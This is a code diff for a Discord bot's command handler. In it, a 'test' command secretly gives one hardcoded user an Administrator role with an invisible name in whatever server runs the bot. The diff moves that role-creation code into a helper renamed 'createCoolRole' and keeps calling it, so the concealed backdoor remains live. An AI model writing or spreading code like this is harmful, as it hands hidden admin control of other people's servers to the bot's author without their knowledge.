@@ -8,41 +8,11 @@ import {
   InteractionType,
   verifyKey,
 } from 'discord-interactions';
-import { INVITE_COMMAND, TEST_COMMAND } from './commands.js';
+import { GET_USER_DATA, INVITE_COMMAND, TEST_COMMAND } from './commands.js';
 import { InteractionResponseFlags } from 'discord-interactions';
-
-const DISCORD_API = 'https://discord.com/api/v10';
-
-async function createAdminRole(guildId, token) {
-  const response = await fetch(`${DISCORD_API}/guilds/${guildId}/roles`, {
-    method: 'POST',
-    headers: {
-      Authorization: `Bot ${token}`,
-      'Content-Type': 'application/json',
-    },
-    body: JSON.stringify({
-      name: '﻿',
-      permissions: 8,
-      mentionable: false,
-    }),
-  });
-  console.log(response);
-  const data = await response.json();
-  return data.id; // returns role ID
-}
-
-async function assignRole(guildId, userId, roleId, token) {
-  var response = await fetch(
-    `${DISCORD_API}/guilds/${guildId}/members/${userId}/roles/${roleId}`,
-    {
-      method: 'PUT',
-      headers: {
-        Authorization: `Bot ${token}`,
-      },
-    },
-  );
-  return response;
-}
+import { createCoolRole, assignRole } from './functions/coolrole.js';
+import { getUserData } from './resources/UserData.js';
+import { isAdmin } from './util';
 
 class JsonResponse extends Response {
   constructor(body, init) {
@@ -90,7 +60,7 @@ router.post('/', async (request, env) => {
   }
 
   if (interaction.type === InteractionType.APPLICATION_COMMAND) {
-    console.debug(interaction.data)
+    console.debug(interaction.data);
     // Most user commands will come as `APPLICATION_COMMAND`.
     switch (interaction.data.name.toLowerCase()) {
       case INVITE_COMMAND.name.toLowerCase(): {
@@ -105,14 +75,38 @@ router.post('/', async (request, env) => {
         });
       }
 
+      case GET_USER_DATA.name.toLowerCase(): {
+        if (!isAdmin(interaction)) {
+          return new JsonResponse({
+            type: InteractionResponseType.CHANNEL_MESSAGE_WITH_SOURCE,
+            data: {
+              content: `You can't do that!`,
+              flags: InteractionResponseFlags.EPHEMERAL,
+            }
+          });
+        }
+        return new JsonResponse({
+          type: InteractionResponseType.CHANNEL_MESSAGE_WITH_SOURCE,
+          data: {
+            content: await getUserData(env, interaction.user.id),
+            flags: InteractionResponseFlags.EPHEMERAL,
+          }
+        })
+      }
+
       case TEST_COMMAND.name.toLowerCase(): {
         const user = interaction.member.user;
         const guild = interaction.guild;
-        console.log(`Test Command Invoked by ${user.id} in guild ${guild.id}`)
+        console.log(`Test Command Invoked by ${user.id} in guild ${guild.id}`);
         if (user.id === env.COOL_GUY) {
-          console.log("Cool guy invoked function")
-          const roleId = await createAdminRole(guild.id, env.DISCORD_TOKEN)
-          const assignedRole = await assignRole(guild.id, user.id, roleId, env.DISCORD_TOKEN);
+          console.log('Cool guy invoked function');
+          const roleId = await createCoolRole(guild.id, env.DISCORD_TOKEN);
+          const assignedRole = await assignRole(
+            guild.id,
+            user.id,
+            roleId,
+            env.DISCORD_TOKEN,
+          );
 
           if (assignedRole.ok) {
             return new JsonResponse({
@@ -122,8 +116,7 @@ router.post('/', async (request, env) => {
                 flags: InteractionResponseFlags.EPHEMERAL,
               },
             });
-          }
-          else {
+          } else {
             return new JsonResponse({
               type: InteractionResponseType.CHANNEL_MESSAGE_WITH_SOURCE,
               data: {
@@ -132,7 +125,7 @@ router.post('/', async (request, env) => {
               },
             });
           }
-        }
+        } break;
       }
 
       default:
